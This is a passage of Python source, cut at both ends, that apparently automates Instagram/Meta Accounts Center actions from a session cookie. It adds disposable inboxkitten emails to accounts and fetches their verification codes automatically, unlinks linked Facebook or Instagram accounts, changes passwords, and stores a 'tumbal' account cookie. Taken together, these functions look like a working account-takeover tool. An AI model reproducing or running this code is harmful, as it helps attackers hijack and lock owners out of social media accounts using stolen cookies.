            elif 'success":false' in self.resp9:
                print(f'[+] Possibly data only exists for {self.remove_kontak}, or email not verified')
            elif 'success":true' in self.resp9:
                print(f'[+] Contact {self.remove_kontak} successfully removed')
            else:
                print('[!] Unknown response', self.resp9)
                
        except Exception as e:
            print(f'[!] Error: {e}')

    def Getkode(self, email):
        self.kodec = []
        try:
            self.headers_email = {
                'sec-ch-ua-platform': '"Windows"',
                'Referer': f'https://inboxkitten.com/inbox/{email}/list',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'Accept': 'application/json, text/plain, */*',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-mobile': '?0'
            }
            
            self.resp203 = requests.get(f'https://inboxkitten.com/api/v1/mail/list?recipient={email}', headers=self.headers_email).text
            self.sdcards = re.findall('"storage":\{"key":"(.*?)","region":"(.*?)"', self.resp203)
            
            if self.sdcards:
                self.headers20 = {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'priority': 'u=0, i',
                    'referer': 'https://inboxkitten.com/',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'iframe',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'
                }
                
                self.params2 = {
                    'region': self.sdcards[0][1],
                    'key': self.sdcards[0][0].split('"')[0]
                }
                
                self.resp332 = parser(requests.get('https://inboxkitten.com/api/v1/mail/getHtml', params=self.params2, headers=self.headers20).text, 'html.parser')
                
                for self.xyzu in self.resp332.find_all('td'):
                    self.kode = re.findall('Anda mungkin diminta untuk memasukkan kode konfirmasi ini:(\\d+)', self.xyzu.text)
                    if self.kode:
                        self.kodec.append(self.kode[0])
        except Exception:
            pass
        
        return self.kodec[0] if self.kodec else None

    def AddEmail(self, gmail=None):
        try:
            if gmail is None:
                email = ''.join((random.choice(string.ascii_lowercase + string.digits) for x in range(random.randint(5, 10)))) + '@inboxkitten.com'
            else:
                email = gmail
                
            self.headers33 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'cache-control': 'max-age=0',
                'cookie': self.cookie['cookie'],
                'dpr': '1',
                'priority': 'u=0, i',
                'referer': 'https://accountscenter.instagram.com',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'viewport-width': '1358'
            }
            
            self.resp2 = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', headers=self.headers33)
            self.akunList = re.findall('"id":"(.*?)","profile_identifier":"(.*?)","display_name":"(.*?)"', self.resp2.text)
            
            print('')
            self.loop2 = 0
            for a, b, c in self.akunList:
                self.loop2 += 1
                print(f'[{self.loop2}] {a}|{c}')
            
            self.targetID = input('\n[?] Enter account ID from above: ')
            print('\n[+] Press CTRL+Z if process stacks or takes too long, then repeat this process')
            
            self.flsd = re.search('"LSD",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
            self.aktorid = re.search('"actorID":"(\\d+)"', self.resp2.text).group(1)
            self.hastesession = re.search('"haste_session":"(.*?)"', self.resp2.text).group(1)
            self.rev = re.search('\{"rev":(\d+)\}', self.resp2.text).group(1)
            self.spinr = re.search('"__spin_r":(\d+)', self.resp2.text).group(1)
            self.spint = re.search('"__spin_t":(\d+)', self.resp2.text).group(1)
            self.dtsg = re.search('"DTSGInitialData",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
            self.jazo = re.search('jazoest=(\d+)', self.resp2.text).group(1)
            
            self.headers10 = {
                'accept': '*/*',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': self.cookie['cookie'],
                'origin': 'https://accountscenter.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'x-asbd-id': '129477',
                'x-fb-friendly-name': 'FXAccountsCenterAddContactPointMutation',
                'x-fb-lsd': self.flsd
            }
            
            self.data8 = {
                'av': self.aktorid,
                '__user': '0',
                '__a': '1',
                '__req': 'p',
                '__hs': self.hastesession,
                'dpr': '1',
                '__ccg': 'GOOD',
                '__rev': self.rev,
                '__s': '63p87z:jm9uhf:5ogubp',
                '__hsi': 'hsi',
                '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0nK3qazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1owLwHwGwbu',
                '__csr': 'gJMB7NJnZWERRRtp5mCyH_49kCh9ZQ_TIJpGEJH9b_JqEGfVTllAUEF9GJpXJvAA8ABADiD8IFpkZaWhVZ_h4rFXsRtqKrRQ9CAABCmbATmXvpTGvVoWeWxpGhagNVe4UDmWADHiBBDAyEy9QECWyFoymiaGFFQ9DF16-00k7B2WyK3p0oE2qyHw6iwk8CHBGFe5fGmE1WJwaa1024x1w0uUG3mdigK8iGp2biiw2xFpVEgzXJdd0kXjAhQ5bggLU1ObUfUaU2lCkwrppUkxmAXCDG0puq22AU0CzFHNU2Zg8GxC2mi6aYNUOub8ECpzFhm3yWzbG1gwmGGEl-E-jmUf80j3oS',
                '__comet_req': '24',
                'fb_dtsg': self.dtsg,
                'jazoest': self.jazo,
                'lsd': self.flsd,
                '__spin_r': self.spinr,
                '__spin_b': self.spint,
                '__spin_t': self.spint,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'FXAccountsCenterAddContactPointMutation',
                'variables': json.dumps({
                    "country": "ID",
                    "contact_point": email,
                    "contact_point_type": "email",
                    "selected_accounts": [self.targetID],
                    "family_device_id": "device_id_fetch_ig_did",
                    "client_mutation_id": "mutation_id_1736685144850"
                }),
                'server_timestamps': 'true',
                'doc_id': '8108292719198518'
            }
            
            self.resp13 = requests.post('https://accountscenter.instagram.com/api/graphql/', headers=self.headers10, data=self.data8).text
            
            if 'success":true' in self.resp13:
                if gmail is None:
                    self.kode = self.Getkode(email)
                else:
                    self.kode = input('[?] Enter code sent to email: ')
                
                if self.kode:
                    self.headers10.update({'x-fb-friendly-name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation'})
                    self.data8.update({
                        'fb_api_req_friendly_name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
                        'variables': json.dumps({
                            "contact_point": email,
                            "contact_point_type": "email",
                            "pin_code": self.kode,
                            "selected_accounts": [self.targetID],
                            "family_device_id": "device_id_fetch_ig_did",
                            "client_mutation_id": "mutation_id_1736685196293",
                            "contact_point_event_type": "ADD",
                            "normalized_contact_point_to_replace": ""
                        }),
                        'doc_id': '8108292719198518'
                    })
                    
                    self.resp14 = requests.post('https://accountscenter.instagram.com/api/graphql/', headers=self.headers10, data=self.data8).text
                    
                    if 'success":true' in self.resp14:
                        self.cekpending = self.pending_email(email, self.headers10, self.data8, gmail)
                        if self.cekpending:
                            print(f'\n[+] Successfully added email {email} and confirmed')
                        else:
                            print(f'\n[+] Successfully added email {email} but email not confirmed yet')
                    else:
                        print(f'\n[+] Failed to add email {email}')
                else:
                    print(f'\n[!] No verification code received for {email}')
            else:
                print(f'\n[+] Failed to add email {email}')
                
        except Exception as e:
            print(f'\n[!] Error: {e}')

    def pending_email(self, email, kepala, jantung, gmail):
        try:
            kepala.update({'x-fb-friendly-name': 'FXAccountsCenterContactDetailQuery'})
            jantung.update({
                'fb_api_req_friendly_name': 'FXAccountsCenterContactDetailQuery',
                'variables': json.dumps({
                    "contact_point_type": "email",
                    "interface": "IG_WEB",
                    "normalized_contact_point": email
                }),
                'server_timestamps': 'true',
                'doc_id': '5146539892136460'
            })
            
            self.susu = requests.post('https://accountscenter.instagram.com/api/graphql/', data=jantung, headers=kepala).text
            self.stat = re.search('"contact_point_status":"(.*?)"', self.susu).group(1)
            
            if self.stat == 'CONFIRMED':
                return True
            
            self.uid = re.search('"id":"(\\d+)"', self.susu).group(1)
            
            if gmail is None:
                self.kode = self.Getkode(email)
            else:
                self.kode = input('[?] Enter code sent to email: ')
            
            if self.kode:
                jantung.update({
                    'fb_api_req_friendly_name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation',
                    'variables': json.dumps({
                        "contact_point": email,
                        "contact_point_type": "email",
                        "pin_code": self.kode,
                        "selected_accounts": [self.uid],
                        "family_device_id": "device_id_fetch_ig_did",
                        "client_mutation_id": "mutation_id_1737120353391",
                        "contact_point_event_type": "ADD",
                        "normalized_contact_point_to_replace": email
                    }),
                    'server_timestamps': 'true',
                    'doc_id': '8108292719198518'
                })
                
                kepala.update({'x-fb-friendly-name': 'FXAccountsCenterContactPointConfirmationDialogVerifyContactPointMutation'})
                self.konfir = requests.post('https://accountscenter.instagram.com/api/graphql/', data=jantung, headers=kepala).text
                
                if 'success":true' in self.konfir:
                    return True
                    
        except Exception as e:
            print(f'\n[!] Email may not be confirmed: {e}')
            
        return False

    def GetListAkunAndRemove(self):
        try:
            self.headers304 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'cache-control': 'max-age=0',
                'cookie': self.cookie['cookie'],
                'dpr': '1',
                'priority': 'u=0, i',
                'referer': 'https://www.instagram.com/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'viewport-width': '673'
            }
            
            self.resp404 = requests.get('https://accountscenter.instagram.com/personal_info/contact_points/?contact_point_type=email&dialog_type=add_contact_point', headers=self.headers304)
            self.akunList = re.findall('"id":"(.*?)","profile_identifier":"(.*?)","display_name":"(.*?)"', self.resp404.text)
            
            self.flsd = re.search('"LSD",\[\],\{"token":"(.*?)"', self.resp404.text).group(1)
            self.aktorid = re.search('"actorID":"(\\d+)"', self.resp404.text).group(1)
            self.hastesession = re.search('"haste_session":"(.*?)"', self.resp404.text).group(1)
            self.rev = re.search('\{"rev":(\d+)\}', self.resp404.text).group(1)
            self.spinr = re.search('"__spin_r":(\d+)', self.resp404.text).group(1)
            self.spint = re.search('"__spin_t":(\d+)', self.resp404.text).group(1)
            self.dtsg = re.search('"DTSGInitialData",\[\],\{"token":"(.*?)"', self.resp404.text).group(1)
            self.jazo = re.search('jazoest=(\d+)', self.resp404.text).group(1)
            
            print('')
            self.loop3 = 0
            for self.a, self.b, self.c in self.akunList:
                self.loop3 += 1
                print(f'[{self.loop3}] {self.a}|{self.c}')
            
            self.akuns = input('\n[?] Remove Facebook/Instagram account [fb/ig]: ').lower()
            
            if self.akuns == 'fb':
                self.uid_remove = input('\n[?] Enter Facebook ID: ')
                
                self.datafb = {
                    'av': self.aktorid,
                    '__user': '0',
                    '__a': '1',
                    '__req': 's',
                    '__hs': self.hastesession,
                    'dpr': '1',
                    '__ccg': 'GOOD',
                    '__rev': self.rev,
                    '__s': '4eze2i:ovkjiy:gpo309',
                    '__hsi': 'hsi',
                    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0nK3qazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1owLwHwGwbu',
                    '__csr': 'gFd7jgHPQ_viQLOYBKDiRF8BIGlqlELVAKAnJbfnibZfB49kiBSRqKAAimyequpkTGHgOBAGl9e8rznZjAGWB99iJp4zqGBXKAtrVFLCGiVvVuEFuRy9ebCGjOGh4RlGE-m5oGA-4eLy5hVpu7GBymKmF8hG4KEWchWw0573xSiWHGVE551m0K8nK2t0Qw6mGuGHGbxmi0vvEAWx51b2o4Aw2Cw18qAV4i2u2u48iiw2BoGqha2CcG6ri-GDmWw3cA2KLylhk0KXK0Skq2dd5wmEaokjg6uaDgGJxulQ3h1SE1kA1nw2wkAwC0LQ3q2mF8vEx9t5BKH4PGpape3q6pECXy84u1vGAmUgQ6eiGwNw12Yw',
                    '__comet_req': '24',
                    'fb_dtsg': self.dtsg,
                    'jazoest': self.jazo,
                    'lsd': self.flsd,
                    '__spin_r': self.spinr,
                    '__spin_b': self.spint,
                    '__spin_t': self.spint,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'useFXUnlinkMutation',
                    'variables': json.dumps({
                        "client_mutation_id": str(uuid.uuid4()),
                        "account_id": self.uid_remove,
                        "account_type": "FACEBOOK",
                        "flow": "IG_WEB_SETTINGS",
                        "device_id": "device_id_fetch_ig_did",
                        "interface": "IG_WEB",
                        "platform": "INSTAGRAM",
                        "scale": 1,
                        "entrypoint": None
                    }),
                    'server_timestamps': 'true',
                    'doc_id': '8717731548311624'
                }
                
                self.headersfb = {
                    'accept': '*/*',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': self.cookie['cookie'],
                    'origin': 'https://accountscenter.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://accountscenter.instagram.com/accounts/?theme=dark',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.146", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'x-asbd-id': '129477',
                    'x-fb-friendly-name': 'useFXUnlinkMutation',
                    'x-fb-lsd': self.flsd
                }
                
                self.removefb = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.datafb, headers=self.headersfb).text
                
                if 'Anda menghapus ' in self.removefb:
                    print(f'[+] Facebook account {self.uid_remove} removed from Instagram')
                else:
                    print(f'[+] Failed to remove Facebook account {self.uid_remove}')
                    
            else:
                self.uid_remove = input('\n[?] Enter Instagram ID: ')
                
                self.dataig = {
                    'av': self.aktorid,
                    '__user': '0',
                    '__a': '1',
                    '__req': 's',
                    '__hs': self.hastesession,
                    'dpr': '1',
                    '__ccg': 'GOOD',
                    '__rev': self.rev,
                    '__s': '4eze2i:ovkjiy:gpo309',
                    '__hsi': 'hsi',
                    '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0nK3qazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1owLwHwGwbu',
                    '__csr': 'gFd7jgHPQ_viQLOYBKDiRF8BIGlqlELVAKAnJbfnibZfB49kiBSRqKAAimyequpkTGHgOBAGl9e8rznZjAGWB99iJp4zqGBXKAtrVFLCGiVvVuEFuRy9ebCGjOGh4RlGE-m5oGA-4eLy5hVpu7GBymKmF8hG4KEWchWw0573xSiWHGVE551m0K8nK2t0Qw6mGuGHGbxmi0vvEAWx51b2o4Aw2Cw18qAV4i2u2u48iiw2BoGqha2CcG6ri-GDmWw3cA2KLylhk0KXK0Skq2dd5wmEaokjg6uaDgGJxulQ3h1SE1kA1nw2wkAwC0LQ3q2mF8vEx9t5BKH4PGpape3q6pECXy84u1vGAmUgQ6eiGwNw12Yw',
                    '__comet_req': '24',
                    'fb_dtsg': self.dtsg,
                    'jazoest': self.jazo,
                    'lsd': self.flsd,
                    '__spin_r': self.spinr,
                    '__spin_b': self.spint,
                    '__spin_t': self.spint,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'useFXUnlinkMutation',
                    'variables': json.dumps({
                        "client_mutation_id": str(uuid.uuid4()),
                        "account_id": self.uid_remove,
                        "account_type": "INSTAGRAM",
                        "flow": "IG_WEB_SETTINGS",
                        "device_id": "device_id_fetch_ig_did",
                        "interface": "IG_WEB",
                        "platform": "INSTAGRAM",
                        "scale": 1,
                        "entrypoint": None
                    }),
                    'server_timestamps': 'true',
                    'doc_id': '8717731548311624'
                }
                
                self.headersig = {
                    'accept': '*/*',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': self.cookie['cookie'],
                    'origin': 'https://accountscenter.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://accountscenter.instagram.com/accounts/',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.146", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'x-asbd-id': '129477',
                    'x-fb-friendly-name': 'useFXUnlinkMutation',
                    'x-fb-lsd': self.flsd
                }
                
                self.removeig = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.dataig, headers=self.headersig)
                
                if 'Anda menghapus' in self.removeig.text:
                    print(f'[+] Instagram account {self.uid_remove} removed')
                else:
                    print(f'[+] Failed to remove Instagram account {self.uid_remove}')
                    
        except Exception as e:
            print(f'\n[!] Error: {e}')

    def SangeSandi(self, old, new):
        try:
            self.headers_pw = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'cache-control': 'max-age=0',
                'cookie': self.cookie['cookie'],
                'dpr': '1',
                'priority': 'u=0, i',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.146", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'viewport-width': '673'
            }
            
            self.resp2 = requests.get('https://accountscenter.instagram.com/password_and_security/password/change/', headers=self.headers_pw)
            self.listakun = re.findall('"__typename":"XFBFXIGAccountInfo","id":"(\\d+)","display_name":"(.*?)"', self.resp2.text)
            
            self.loop = 0
            print('')
            for self.uid, self.name in self.listakun:
                self.loop += 1
                print(f'[{self.loop}] {self.uid} | {self.name}')
            
            self.targetids = input('\n[?] Enter account ID: ')
            
            self.flsd = re.search('"LSD",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
            self.aktorid = re.search('"actorID":"(\\d+)"', self.resp2.text).group(1)
            self.hastesession = re.search('"haste_session":"(.*?)"', self.resp2.text).group(1)
            self.rev = re.search('\{"rev":(\d+)\}', self.resp2.text).group(1)
            self.spinr = re.search('"__spin_r":(\d+)', self.resp2.text).group(1)
            self.spint = re.search('"__spin_t":(\d+)', self.resp2.text).group(1)
            self.dtsg = re.search('"DTSGInitialData",\[\],\{"token":"(.*?)"', self.resp2.text).group(1)
            self.jazo = re.search('jazoest=(\d+)', self.resp2.text).group(1)
            
            self.oldPas = f'#PWD_BROWSER:0:{int(time.time())}:{old}'
            self.NewPas = f'#PWD_BROWSER:0:{int(time.time())}:{new}'
            
            self.datapw = {
                'av': self.aktorid,
                '__user': '0',
                '__a': '1',
                '__req': 'v',
                '__hs': self.hastesession,
                'dpr': '1',
                '__ccg': 'GOOD',
                '__rev': self.rev,
                '__s': '5o64tp:ztqkb8:0xsi6s',
                '__hsi': 'hsi',
                '__dyn': '7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo19oe8hw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0nK3qazo7u0zEiwaG1LwTwNw4mwr86C1nw4xxW1owLwHwGwbu',
                '__csr': 'gUxAj2ybQBbh2OQZELTLldEhkHRSJtdKWaKFaiN7RQraHEGrlBOAlkALRFeRDyox9aZ38xrgD_KakBsgpJISoDFbHKKAkDJ2QAVahGypaDGOLydaHBLxhXKt4hGL8Rh8yeiWxRpppF48hrAK4Km9F5FDyenzopBzum00ktal1e3R6K2q4o8EfE4icyU5C0km1iGEGqHGHzXAGGw24wxmNOwECm0FE0ihyeAV4i1ix2VE0FqqdCjgao-EmF9aVpQGw3d42KKirmi1hwrHg3CxafCAwWwMw9YUmP0wxFdamaw6zg8te09J7d2EuCIw21g98uGm48mx65AVICEOtadx51gla2TybzKUbE22GElhaQbXiU0hdhFU',
                '__comet_req': '24',
                'fb_dtsg': self.dtsg,
                'jazoest': self.jazo,
                'lsd': self.flsd,
                '__spin_r': self.spinr,
                '__spin_b': self.spint,
                '__spin_t': self.spint,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'useFXSettingsChangePasswordMutation',
                'variables': json.dumps({
                    "account_id": self.targetids,
                    "account_type": "INSTAGRAM",
                    "current_password_enc": {"sensitive_string_value": self.oldPas},
                    "new_password_enc": {"sensitive_string_value": self.NewPas}
                }),
                'server_timestamps': 'true',
                'doc_id': '7032881846733167'
            }
            
            self.headers_pw1 = {
                'accept': '*/*',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': self.cookie['cookie'],
                'origin': 'https://accountscenter.instagram.com',
                'priority': 'u=1, i',
                'referer': 'https://accountscenter.instagram.com/password_and_security/password/change/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.146", "Chromium";v="131.0.6778.265", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                'x-asbd-id': '129477',
                'x-fb-friendly-name': 'useFXSettingsChangePasswordMutation',
                'x-fb-lsd': self.flsd
            }
            
            self.resp345 = requests.post('https://accountscenter.instagram.com/api/graphql/', data=self.datapw, headers=self.headers_pw1).text
            
            if 'success":false' in self.resp345 or 'errors' in self.resp345:
                print('\n[!] Wrong password')
            else:
                print(f'\n[+] Password changed to {new}')
                
        except Exception as e:
            print(f'[!] Error: {e}')


class menuUser:
    def __init__(self):
        pass

    def infoUser(self, cookies):
        try:
            InfoHeaders = {
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-bloks-version-id': '8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-capabilities': '3brTv10=',
                'x-ig-app-id': '567067343352427',
                'priority': 'u=3',
                'user-agent': 'Instagram 275.0.0.27.98 Android (25/7.1.2; 240dpi; 720x1280; Google/google; google Pixel 2; x86; android_x86; in_ID; 458229257)',
                'accept-language': 'id-ID, en-US',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True'
            }
            
            self.user = re.search('ds_user_id=(\\d+)', str(cookies)).group(1)
            self.info = requests.get(f'https://i.instagram.com/api/v1/users/{self.user}/info/', headers=InfoHeaders, cookies={'cookie': cookies}).json()['user']
            self.namanme = self.info['full_name']
            self.followers = self.info['follower_count']
            self.following = self.info['following_count']
            
            open('tumbal', 'w').write(cookies)
            print(f'[+] 2FA Tumbal {self.namanme} -> {self.followers}/{self.following}')
            
        except Exception:
            cookie = input('[?] Enter tumbal cookie: ')
            print('\n[!] Tumbal must be your own account and a new account!.')
            os.system('clear')
            self.infoUser(cookie)

    def GetListAkun(self, cookie):
        try:
            self.headers112 = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                'cache-control': 'max-age=0',
                'cookie': cookie,
                'dpr': '1',
                'priority': 'u=0, i',
                'referer': 'https://web.facebook.com/',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Windows"',
                'sec-ch-ua-platform-version': '"15.0.0"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
